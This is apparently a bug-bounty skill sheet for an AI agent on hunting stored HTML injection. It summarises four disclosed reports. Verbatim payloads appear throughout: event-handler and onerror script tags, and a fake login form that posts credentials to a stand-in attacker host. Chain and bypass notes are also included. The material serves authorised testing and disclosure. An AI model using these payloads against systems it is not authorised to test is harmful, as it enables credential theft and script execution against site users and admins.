---
name: hunter-l3-stored-html-injection
description: "Use when hunting Stored HTML Injection on a target. Loads the L3 technique sheet: Stored HTML Injection is the class of bugs where attacker-controlled text is persisted server-side (comments, form submissions, profile fields, email headers) and later rendered **as raw HTML** in a v"
domain: cybersecurity
subdomain: web
tags:
- web
- stored-html-injection
- hunting
- l3
version: '1.0'
---

# Stored HTML Injection — Technique Sheet

## Overview

Stored HTML Injection is the class of bugs where attacker-controlled text is persisted server-side (comments, form submissions, profile fields, email headers) and later rendered **as raw HTML** in a victim's browser or mail client, without sanitization or encoding. Unlike reflected XSS, the payload travels through storage and fires in someone else's session or inbox — typically an admin, moderator, or fellow user. It pays best when the rendering context is privileged (admin review queues, notification emails sent from official addresses) because the injection becomes a phishing / credential-harvesting primitive even when full script execution is debatable. Programs from CMSs (Concrete CMS, Nextcloud) to SaaS platforms (Slack, WakaTime) have paid for this class; CVEs are attainable (e.g., CVE-2025-66514 in Nextcloud Mail).

---

## Distinct sub-patterns

The records contain four distinct sub-patterns. They differ in **where the payload is stored**, **who triggers the render**, and **what the render context allows** — which drives both the payload choice and the impact story.

### Sub-pattern 1: Event-handler attribute in user-generated comments (blog/UGC)

- **Endpoint shape:** `POST` to the blog post comment endpoint (unauthenticated or low-priv user), parameter: **comment body**.
  - Template: `POST /blog/<post-id>/comment` — body field: `comment=<payload>`
- **Payload that actually fired (verbatim):**
  ```html
  <p onload="javascript:alert('sss');">Done</p><strike> test </strike>
  ```
  (Report: id=245233, WakaTime)
- **Root-cause pattern:** The blog comments feature renders submitted HTML as-is — tag structure AND event-handler attributes (`onload`, `onerror`, etc.) survive storage and rendering. There is no sanitizer pass and no HTML-encoding of the comment body; the app trusts stored content because it "already passed through a form."
- **Impact that was proven:** The injected markup, including the `onload` event attribute, was rendered on the blog comments page for every viewer; the reporter states the injected code runs. That means arbitrary attribute-based script execution in the context of any visitor to the post — a stored XSS-equivalent condition.
- **Exemplar report IDs:** 245233 (WakaTime). Chain recorded: (1) submit HTML payload as blog comment → (2) comment is stored and rendered with the onload attribute → (3) injected script executes for comment viewers.

**Why this works:** many blog engines historically allow "rich" comment bodies. Test whether the *stored* body — not just the preview — keeps attributes. The `<strike> test </strike>` tail in the payload is a classic marker trick: harmless formatting that proves storage/rendering even if the event handler is stripped, letting the reporter demonstrate which sanitization step (if any) exists.

### Sub-pattern 2: HTML in profile "first name" → outbound email injection (phishing)

- **Endpoint shape:** Account profile update endpoint, parameter: **first name** (or any name field propagated to outbound mail). Payload is later rendered in **promotional emails sent from the company's official address to other users**.
  - Template: `PUT /api/user/profile` — `first_name=<payload>` → rendered into `template: Hello <first_name>, ...` in bulk emails.
- **Payload that actually fired (verbatim):** `<img>`
  (Report: id=321029, Slack)
- **Root-cause pattern:** The first name is stored in the backend database and inserted into outgoing emails **without sanitization** — the mail pipeline treats the stored name as trusted template data, so raw HTML inserted into the name field is interpreted by the recipient's mail client. The injection persists in storage and fires later, in *someone else's* inbox, from a *trusted sender*.
- **Impact that was proven:** HTML stored in the backend and rendered in promotional emails sent from an official Slack address — a **targeted phishing** primitive. Even a minimal tag like `<img>` proves HTML interpretation; in a real chain the attacker injects a full spoofed login block (see Sub-pattern 4's form technique) into every email the company sends.
- **Exemplar report IDs:** 321029 (Slack). No chain recorded — single step: set the name, wait for the promotional send.

**Why this works:** name fields are validated loosely (or validated only against JS-injection, not HTML) at signup, and mail templating is a second, forgotten render sink. The kill chain crosses a **trust boundary**: attacker-controlled string → vendor-owned sender address → victim inbox. That trust amplification is the impact argument.

### Sub-pattern 3: Email subject header rendered as HTML (mail client stored injection)

- **Endpoint shape:** Email/message composition in the platform's mail product, parameter: **subject** (any user-supplied message header the client later displays).
  - Template: mail app (nextcloud/mail) — compose message with `Subject: <payload>`; payload renders when the message list or message view displays the subject.
- **Payload that actually fired (verbatim):**
  ```html
  <img src=x onerror=alert(1)>
  ```
  (Report: id=3357036, Nextcloud — nextcloud/mail)
- **Root-cause pattern:** Email subject text was rendered as HTML **without sanitization**. The subject is header data, so developers often treat it as plain text and forget to encode it in the list-view and detail-view templates; the attacker's string goes straight into the DOM.
- **Impact that was proven:** Stored HTML injection in the mail subject — significant enough to earn **CVE-2025-66514**. The self-contained `onerror` handler fires on render with no user interaction beyond viewing the mail list, giving script execution in the recipient's mail-client context.
- **Exemplar report IDs:** 3357036 (Nextcloud). No chain recorded — the payload is a single self-firing step.

**Why this works:** the `img src=x onerror=...` form is the canonical minimal self-executing stored payload: no external dependency, fires immediately when the element enters the DOM. Subjects are also **attacker-chosen delivery**: you pick the victim by emailing them, unlike profile fields where rendering depends on vendor emails.

### Sub-pattern 4: Full phishing-form injection via contact/message forms (admin review trigger)

- **Endpoint shape:** Unauthenticated contact form, parameter: **message**.
  - Template: `POST /contact-us` — `message=<payload>`; payload renders when an **admin opens the message in the admin panel**.
- **Payload that actually fired (verbatim, truncated in record):**
  ```html
  <form Method="POST" Action="http://www.test.com/">Phishingpage :<br />Username :<br /><input name="User" /><br />Password :<br /><input name="Password" type="password" /><br /><input name="Valid" value="Ok !" type="submit" /></form><img src="https://www.petmd.com/sites/default/files/Acute-Dog-Diarrh
  ```
  (Report: id=768327, Concrete CMS — the payload is cut off in the record after the img src opening; an `<img src=...>` decoy/redirect image follows the form)
- **Root-cause pattern:** The unauthenticated Contact Us message is stored and then rendered as raw HTML in the admin's message-viewing interface — no sanitization anywhere between the public form and the privileged admin page. Note the root cause is precisely that the *submitter is unauthenticated*, yet the content lands in a *privileged* render context: the least-trusted input feeds the most-trusted viewer.
- **Impact that was proven:** The admin viewing the contact submission saw an embedded malicious HTML/phishing form, and clicking inside it **redirected them to an attacker-controlled site** (`action="http://www.test.com/"`). Even absent script execution, injected form markup harvests credentials or moves the admin to an attacker page — a complete phishing primitive inside the admin panel.
- **Exemplar report IDs:** 768327 (Concrete CMS). No multi-step chain recorded; the flow is submit → admin views → victim interacts.

**Why this works:** injected `<form action="http://attacker/">` with username/password inputs renders as a plausible login prompt inside a trusted admin UI. The form POSTs whatever the admin types directly to the attacker's server. The trailing `<img src="http://...">` doubles as an out-of-band beacon (the admin's browser requests the attacker's URL when rendering, confirming delivery and IP) and/or redirect lure.

---

## Bypass / chain notes

Bypasses and multi-step chains actually observed or implied in these records:

1. **Cross-context chain (Sub-pattern 2):** the injection chain crosses two products — a *web profile field* is the sink-input and the *email pipeline* is the sink. If the web UI strips your payload on preview, check whether the **stored raw value** still reaches other consumers (emails, PDFs, exports, mobile apps). Test each consumer separately: sanitization is rarely applied at every egress point. Verify by setting the name to `<img>` and triggering a vendor email (in Slack's case, a promotional send did it for you — watch for newsletters, password-reset mails, team invites, invoices).
2. **Zero-interaction firing:** the `onerror` pattern (`<img src=x onerror=alert(1)>`) requires no user interaction beyond page render — in a mail-list view this means *previewing the inbox is enough*. Prefer self-firing payloads over ones requiring a click when demonstrating impact.
3. **Form injection as script-free execution:** where CSP or output encoding kills `<script>`, injected `<form>`/`<input>`/`<a action|href>` markup still yields credential capture and forced navigation (Sub-pattern 4). This is the fallback when you suspect JS execution is blocked but raw HTML is not.
4. **Marker-tag layering:** the WakaTime payload pairs an event-handler tag with an inert formatting tag (`<strike> test </strike>`). If the report window shows the formatting tag but the handler seems dead, you still have "stored HTML injection with limited execution" — a payable finding — and you learn exactly which sanitization layer exists. Layer payloads: one tag to prove storage, one to prove execution.
5. **Unauthenticated storage → authenticated render:** the Concrete CMS pattern is itself a chain: public unauthenticated form → stored → admin panel render. Seek sink-pages behind login that render public submissions (contact queues, moderation queues, support tickets, abuse reports). The privilege differential is the whole impact case.

## Gotchas / what NOT to do

- **Don't assume preview == storage.** Some editors sanitize the live preview but store raw input (or vice versa). Always re-open the stored object as a fresh viewer to test the real render path.
- **Don't stop at "HTML rendered."** The four records show the impact gradient: inert HTML (weakest), event-handler script execution (WakaTime, Nextcloud → CVE), phishing form + forced redirect in an admin panel (Concrete CMS), and trusted-sender email spoofing (Slack). Frame your report at the highest tier you can actually demonstrate — but inert HTML in an *official outbound email* is still payable (Slack paid for `<img>`).
- **Don't fire payloads in emails you can't contain.** Injecting into promotional email pipelines reaches *all* recipients. Test with a self-addressed or obviously-harmless marker (`<img>`) rather than a credential-harvesting form against a production mailing list — the Slack record used exactly the minimal `<img>` marker.
- **Don't rely on `<script>` tags.** None of the four winning payloads used one. Event-handler attributes on `p`/`img`, and plain form markup, are what fired.
- **Don't trust the payload field as the only sink.** The Nextcloud bug is in a *header* (subject), not a body. Headers, names, and other "metadata" fields are systematically less sanitized than rich-text bodies.
- **Don't forget the reporter's context matters:** the Concrete CMS payload is truncated in the record (`<img src="https://www.petmd.com/...` cut off) — the record only proves the form injection and redirect-on-click; don't overclaim beyond what renders.
- **Don't skip unauthenticated forms.** Sub-pattern 4's submitter was unauthenticated; most hunters deprioritize contact forms, which is exactly why they remain unsanitized.

## Real-world impact examples

- **WakaTime (id=245233):** `<p onload="javascript:alert('sss');">Done</p><strike> test </strike>` submitted in a blog comment rendered with the event attribute intact on the public comments page — script execution for every viewer of the post, chained: submit → stored render → viewer-side execution.
- **Slack (id=321029):** first name set to `<img>` was stored and rendered unsanitized inside **promotional emails from Slack's official address** — attacker-controlled HTML delivered to arbitrary users from a fully trusted sender: a targeted-phishing foothold with a three-character payload.
- **Nextcloud Mail (id=3357036):** subject line `<img src=x onerror=alert(1)>` executed in the mail client on render — assigned **CVE-2025-66514**, zero user interaction beyond viewing mail.
- **Concrete CMS (id=768327):** an unauthenticated contact-form message containing a full fake login form (`<form Method="POST" Action="http://www.test.com/">` with User/Password inputs) rendered inside the admin's message view — the embedded form submitted credentials to the attacker's site and clicking redirected the admin to a malicious page.